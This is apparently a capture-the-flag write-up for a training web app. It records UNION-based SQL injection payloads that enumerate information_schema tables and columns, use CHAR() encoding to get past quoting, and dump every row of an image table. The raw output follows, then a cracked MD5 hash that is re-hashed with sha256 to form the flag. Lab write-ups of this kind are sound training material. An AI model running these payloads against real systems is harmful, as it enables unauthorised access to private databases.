1 AND 1=0 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()-- 
table name = list_images

columns = 1 AND 1=0 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=CHAR(108,105,115,116,95,105,109,97,103,101,115)--

ID: 1 AND 1=0 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=CHAR(108,105,115,116,95,105,109,97,103,101,115)-- 
Title: 
Url : id
ID: 1 AND 1=0 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=CHAR(108,105,115,116,95,105,109,97,103,101,115)-- 
Title: 
Url : url
ID: 1 AND 1=0 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=CHAR(108,105,115,116,95,105,109,97,103,101,115)-- 
Title: 
Url : title
ID: 1 AND 1=0 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=CHAR(108,105,115,116,95,105,109,97,103,101,115)-- 
Title: 
Url : comment



1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images

ID: 1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_
ID: 1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
Title: 1https://fr.wikipedia.org/wiki/Programme_NsaAn image about the NSA !
Url : 1
ID: 1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
Title: 2https://fr.wikipedia.org/wiki/Fichier:4242 !There is a number..
Url : 1
ID: 1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
Title: 3https://fr.wikipedia.org/wiki/Logo_de_GoGoogleGoogle it !
Url : 1
ID: 1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
Title: 4https://en.wikipedia.org/wiki/Earth#/medEarthEarth!
Url : 1
ID: 1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
Title: 5borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : 1



https://crackstation.net/  ----> 1928e8083cf461a51303633093573c46 ----> albatroz

echo -n "albatroz" | sha256sum ------> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188